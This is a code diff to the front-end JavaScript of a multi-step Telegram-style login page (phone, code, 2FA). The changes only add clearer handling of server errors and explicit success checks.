@@ -68,10 +68,10 @@ async function post_body(endpoint, body) {
       method: 'POST',
       body: body
     });
-    return await response.text();
+    const text = await response.text();
+    return response.ok ? text : (text || `HTTP ${response.status}`);
   } catch (error) {
-    showToast("Network Error", error.message, "error");
-    return null;
+    return `Network error: ${error.message}`;
   }
 }
 
@@ -119,8 +119,12 @@ document.getElementById("btn-step-2").onclick = async () => {
   
   btn.innerHTML = 'Send Code <i class="fas fa-paper-plane"></i>';
 
-  showToast("Sent", "Code sent to your Telegram app", "success");
-  goToStep(3);
+  if (data === 'enter_code') {
+    showToast("Sent", "Code sent to your Telegram app", "success");
+    goToStep(3);
+  } else {
+    showToast("Could not send code", data || "No response from server.", "error");
+  }
 };
 
 document.getElementById("btn-step-3").onclick = async () => {
@@ -167,10 +171,12 @@ async function submitCode(is2faStep) {
     }
   } else if (response === "invalid_phone_code") {
     showToast("Error", "Invalid code. Try again.", "error");
-  } else {
+  } else if (response === "success") {
     showToast("Welcome", "You are successfully logged in!", "success");
     document.querySelector('.step-content.active').classList.remove('active');
     document.getElementById('step-success').classList.add('active');
+  } else {
+    showToast("Authorization failed", response || "No response from server.", "error");
   }
 }
 
